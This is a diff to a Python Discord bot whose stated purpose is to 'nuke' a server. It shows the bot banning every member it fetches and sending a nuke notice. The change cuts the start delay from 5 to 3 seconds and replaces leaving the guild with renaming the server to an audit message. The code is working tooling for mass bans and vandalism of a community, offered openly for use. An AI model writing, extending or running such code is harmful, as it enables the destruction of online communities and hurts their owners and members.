@@ -58,10 +58,9 @@ async def on_ready():
         await bot.close()
         sys.exit(1)
     logging.info(f"Bot is {bot.user.name}#{bot.user.discriminator} (ID {bot.user.id})")
-    logging.info("Waiting 5 seconds...")
-    await asyncio.sleep(5)
+    logging.info("Waiting 3 seconds...")
+    await asyncio.sleep(3)
     logging.info(f"Starting nuke on {guild.name}")
-
     logging.debug("Attempting to ban all members")
     async for member in guild.fetch_members():
         member_full = f"{member.name}#{member.discriminator} (ID {member.id})"
@@ -104,15 +103,13 @@ async def on_ready():
     except Exception:
         logging.error("Unable to send nuke notification to guild")
 
-    logging.info("Nuke complete")
-    logging.info("Leaving guild before exiting")
+    logging.info("Attempting to change server name")
     try:
-        await guild.leave()
+        await guild.edit(name=audit_msg, reason=audit_msg)
+        logging.info("Successfully changed server name")
     except Exception:
-        logging.error("Unable to leave guild")
-    logging.info("Exiting with code 0")
-    await bot.close()
-    sys.exit()
+        logging.error("Unable to change server name")
+    logging.info("Nuke complete")
 
 
 # Login
